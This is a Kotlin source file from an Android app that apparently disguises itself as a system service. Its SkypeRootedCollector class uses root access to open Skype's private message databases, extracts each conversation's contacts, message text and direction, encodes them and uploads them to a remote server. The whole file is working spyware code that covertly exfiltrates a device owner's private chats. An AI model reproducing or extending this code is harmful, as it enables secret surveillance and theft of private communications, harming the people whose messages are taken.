package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import com.android.services.db.entities.SkypeRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import org.json.JSONObject
import java.io.File

class SkypeRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncSkype) {
            try {
                val skypeList = retrieveSkypeMessages(context, localDatabaseSource)
                if (skypeList.isNotEmpty()) {
                    val startDate = skypeList[skypeList.size - 1].date
                    val endDate = skypeList[0].date
                    val mSkypeSender = RemoteServerHelper(
                        context,
                        AppConstants.SKYPE_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mSkypeSender.upload(skypeList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.SKYPE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.SKYPE_ROOTED_TYPE} Sync is Off")
        }
    }

    companion object {

        private const val skypeFolder = "com.skype.raider"
        private var databasesList = arrayListOf<String>()

        private fun retrieveSkypeMessages(
            context: Context,
            localDatabaseSource: LocalDatabaseSource,
        ): List<SkypeRooted> {
            var skypeRootedList = ArrayList<SkypeRooted>()
            try {
                RootPermission.acquireSkypeDatabasePermission()
                val databaseDir = File(AppConstants.SKYPE_DB_PATH)
                if (databaseDir.exists()) {
                    val files = databaseDir.listFiles() ?: emptyArray()
                    files.forEach { inFile ->
                        if (inFile.isFile) {
                            val fileName = inFile.name
                            if (fileName.contains("live:") && !fileName.contains("journal")) {
                                if (!databasesList.contains(fileName)) databasesList.add(fileName)
                            }
                        }
                    }
                }
                if (databasesList.size > 0) {
                    for (i in databasesList.indices) {
                        val dbName = databasesList[i]
                        RootPermission.acquireSkypeDatabaseFilesPermission(dbName)
                        val skypeDBPath = ("/data/data/"
                                + skypeFolder
                                + "/databases/"
                                + dbName)
                        var maxTimeStamp = localDatabaseSource.selectSkpyeRootedMaxTimeStamp()
                        if (maxTimeStamp == null) {
                            maxTimeStamp = 0L
                        }

                        val database = SQLiteDatabase.openDatabase(
                            skypeDBPath,
                            null,
                            SQLiteDatabase.OPEN_READONLY
                        )
                        val cursor =
                            database.query("messagesv12", null, null, null, null, null, null)
                        if (cursor != null) {
                            while (cursor.moveToNext()) {
                                try {
                                    val nspData =
                                        cursor.getString(cursor.getColumnIndex("nsp_data"))
                                    val messageObject = JSONObject(nspData)
                                    val conversationId = messageObject.getString("conversationId")
                                    val timeStamp = messageObject.getString("createdTime")
                                    if (timeStamp.toLong() > maxTimeStamp) {
                                        val message = messageObject.getString("content")
                                        val isMyMessage = messageObject.getInt("_isMyMessage")
                                        val messageTextType = messageObject.getString("messagetype")
                                        val messageType =
                                            if (isMyMessage == 0) "incoming" else "outgoing"
                                        val split = conversationId.split(":").toTypedArray()
                                        val conversationName = split[1]

                                        if (messageTextType == "RichText" || messageTextType == "Message") {
                                            // Insert Skype Rooted Message Record to db
                                            val skypeRooted = SkypeRooted()
                                            skypeRooted.apply {
                                                this.messageId = timeStamp
                                                this.conversationId = conversationId
                                                this.conversationId = conversationName
                                                this.message =
                                                    AppUtils.convertStringToBase64(message)
                                                this.type = messageType
                                                this.messageDatetime =
                                                    AppUtils.formatDate(timeStamp)
                                                this.call = false
                                                this.duration = ""
                                                this.senderName = conversationName
                                                this.conversationId = conversationId
                                                this.timeStamp = timeStamp.toLong()
                                                this.date = AppUtils.getDate(timeStamp.toLong())
                                            }
                                            skypeRootedList.add(skypeRooted)
                                        }
                                    }
                                } catch (e: Exception) {
                                    logVerbose(
                                        "${AppConstants.SKYPE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                                        throwable = e
                                    )
                                }
                            }
                            cursor.close()
                        }
                        database.close()
                    }
                }
                logVerbose("${AppConstants.SKYPE_ROOTED_TYPE} rooted list = $skypeRootedList")
                if (skypeRootedList.isNotEmpty())
                    localDatabaseSource.insertSkypeRooted(skypeRootedList)
                localDatabaseSource.selectSkypeRooted {
                    skypeRootedList = it as ArrayList<SkypeRooted>
                }
                logVerbose("${AppConstants.SKYPE_ROOTED_TYPE} selected list = $skypeRootedList")
            } catch (e: Exception) {
                logVerbose(
                    "${AppConstants.SKYPE_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
            return skypeRootedList
        }
    }

}